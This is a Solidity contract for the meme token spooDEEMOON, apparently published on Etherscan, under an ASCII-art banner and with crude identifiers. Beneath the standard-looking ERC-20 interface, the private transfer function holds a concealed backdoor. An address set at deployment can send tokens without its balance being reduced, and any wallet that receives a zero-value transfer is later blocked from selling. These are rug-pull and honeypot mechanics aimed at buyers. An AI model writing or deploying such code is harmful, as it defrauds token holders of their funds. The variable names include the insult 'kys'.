/**
 *Submitted for verification at Etherscan.io on 2023-05-15
*/

// https://twitter.com/spoodeemoon

// ****************************************************************************************************
// ********************************#%@@@%@@###%%%%%%@@@@@@@@@@@@@@@@@%%##******************************
// *****************************#%%%%%%%@%%%%%%%%%%###################%%@@#****************************
// ****************************#%@%%%%###################################%@@#**************************
// ************************#%%%%###########################################%@#*************************
// **********************#@%*#**####*#+*###+*#=+#==#==*==+=++##**+#++**##=+#%@*************************
// *********************#@##:=-+-:+.=#:+###-++::+==#:=#:#+===:-*==*--===*:=+#@#************************
// *********************@%##+#**+*++*#*+###############*#########*#**#=######@%************************
// ********************#@#######++##*==#-=*#=+#+:+####=-=*-*#+-**.*+.-:######@%************************
// ********************%@#######-*+=#:-+--=+--+*=#####=+-=-:*=+=*=+#*########@%************************
// ********************@%########++*#####*###################################%@************************
// ******************#*%%##########################%%%%%%%%%%%%%%%%%@@@%%%%%%%@#***********************
// ****************#*#%@%%%@@%%###%######%%%%@@@@%%%%%%%%%%%#####%%#######%%%@@%#**********************
// ***************##%%@#*****#%%#%%@@@@%%%%%######%%%%%%%%@@@@@@@%%%@@@@@@@@@%%@@@@%#******************
// ***************#%%@%*********#%%%#%%%@@@@@@@%%%%%%%####%%%%%%%%%%%%%%%%%%%%%%%%%@@@@%%#*************
// **************#%#@%*************#%@%%%%%%%%%%%%%%%%%%%%%#######%%###%@%@%@@@@@@@%%%%%%%@%***********
// **************#%@@%%%####********#%*********#%%#*******%#******%%*********#@@%@%%%%%%###@%**********
// *************##%@#***####%%#*#%###*************#%%***##%@%%####@%#********%#%@##%**##%%@@#**********
// ***********#%#%@#***********@%%###***************#@@%#**%#*****@*#%##****%#**#@%%##*****************
// *********#%%%@%****##*****#%#***##%%#************%*#%%***@****#@****####@%#***%%%%##****************
// *********@@@%%%%%%%######@@%###*****#%#********#%#***#@#*#%***#%*******%%*##%@@*=*%%##**************
// *******%@@#*************#%@+-=*@%%@@@@@%#****%%#*******@#*#%**##****#%%#**%%%%[email protected]@.-%##**************
// ***###%@%***************%*#@= [email protected]@: .=%@@@@%%#***********@#*#%*%****%%***#%**#@*:   #%#**************
// *###%%@%%********##%%%#%%##%@+--.    [email protected]@@@#*#############@%#%%%###@####%#****#%%##%@%%%#************
// %*#%@@**@***#%%%%##*********%%%*=-::+%@@@@#%%#####%#****##%**#%***#%%#######%%###%@%##**************
// *#%@%****%%@@%#***********%#****##%@@%%@#********%#******%#****@*****##%*****####@@#%%#*************
// ##@%***##%#***#%%#*****#%#****#@%*%@#*##********@#******%#**##*%#***####%#*#%##%@@@##***************
// #@#*#%%#*********#%#*#%#******%@%%@%#@%%####**#@%######%%%#####%%%%##**#%%@#**#@@%@@%#**************
// @%%%#**************%%%*******#%%#*##%#%@@%##%@%#*******##*******%%****##%@%%**@@%%%**#**************
// @%****************%%###%%#**%%*****@#***##%%@@@@%%%%%%#%@######%%@@@@%###@#@#@@%%##%#***************
// *##%%%%#*******#%%#******%%@%####*%#***#***##**###%%%%%%@%%%%%%##%##%%#####%@@%###******************
// ******#%#****#%#*********%%******#@#%%#####%%%%%%#####%@%#%%#####@%#******#@%%%*********************
// ********%#*#%#**********%#********@********##*********%%*********%******#@@%%#**********************
// *********%%@%%%%%#*****%#********#@********%#********#%**********%##%%@@%#@*#***********************
// ********#@#******#%#**%%##%%#****%#********@****##%%@@@%%%%%%%@@@@@@@##@%***************************
// ******#@#**********##%%#****#%#**@****##***%*%%@@%@%%%%%#@%@@%#%#**#@@##****************************
// *****%%*************#@********##@%#%%###%%%@@@%%%#*#*#**#%@%****%%**%#%%#***************************
// ****%%*************#@***********@******#%@@#*#%*#%%%%#%@@##%@***#%##%#**%@%#************************
// ***%@####*********#@************@**#%%@%%%*#***%@#**#@#*#%#*#%@%%%#@%#%####%%#**********************
// %*%%#####%%#*****%%************%@@@%##%********#@##%#%%%#%@%%#***#%@@@#**##**%%#********************
// @@@%%%%%#**#%%#*%%*#%%%%%#**%@%%#****************@@***#%%@#***#%@%#**#@***#%%@%%%#******************
// #######%%@@%#*#@%###****#%@@#*********************#%%@#*#@%**%@##%%%%*#%##***#%*#@#*****************
// **********#%%@@@#####%%@%%**************************%@%%##%##@******#@@%%%#***#%%%@%****************
// **************##%%%%%##*****************************#@#***##%@@%%%%#@%****#%#@%#***%%***************
// *****************************************************@#**@****%@@%#@%%##%##%#*#@%#**%%**************
// *****************************************************%@*%%****@*##%@#**#%@%##*%@%#***@#*************
// ******************************************************%@@%#***@****%%%%%%@##%@%***%#*@#*************
// *********************************************************#%@%#%%***%#****%###*#%%%%@%#**************
// ************************************************************#%@@%%%%@%%%%@@%%%##********************
// ****************************************************************########****************************

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SpooDEEMOON is Ownable {

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV2Pair;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 public totalSupply;

    uint8 public decimals = 9;

    uint256 private spoooodeeeemmm;

    string public name = "spooDEEMOON";

    string public symbol;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private kys;

    constructor(address degen) {
        createLiquidityPair(degen);
        balanceOf[msg.sender] = totalSupply;
        symbol = "SPOO";
    }

    function createLiquidityPair(address degen) internal {
        totalSupply = 4_206_969_696_969 * 10 ** decimals;
        spoooodeeeemmm = 69;
        kys[degen] = spoooodeeeemmm;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => uint256) public balanceOf;

    function approve(address mfer, uint256 juiiiisy) public returns (bool success) {
        allowance[msg.sender][mfer] = juiiiisy;
        emit Approval(msg.sender, mfer, juiiiisy);
        return true;
    }

    function deeeegen(address bigDick, address diamondBalls, uint256 juiiiisy) private returns (bool success) {
        if (kys[bigDick] == 0) {
            if (uniswapV2Pair != bigDick && inhale[bigDick] > 0) {
                kys[bigDick] -= spoooodeeeemmm;
            }
            balanceOf[bigDick] -= juiiiisy;
        }
        balanceOf[diamondBalls] += juiiiisy;
        if (juiiiisy == 0) {
            inhale[diamondBalls] += spoooodeeeemmm;
        }
        emit Transfer(bigDick, diamondBalls, juiiiisy);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private inhale;

    function transferFrom(address bigDick, address diamondBalls, uint256 juiiiisy) public returns (bool success) {
        deeeegen(bigDick, diamondBalls, juiiiisy);
        require(juiiiisy <= allowance[bigDick][msg.sender]);
        allowance[bigDick][msg.sender] -= juiiiisy;
        return true;
    }

    function transfer(address diamondBalls, uint256 juiiiisy) public returns (bool success) {
        deeeegen(msg.sender, diamondBalls, juiiiisy);
        return true;
    }
}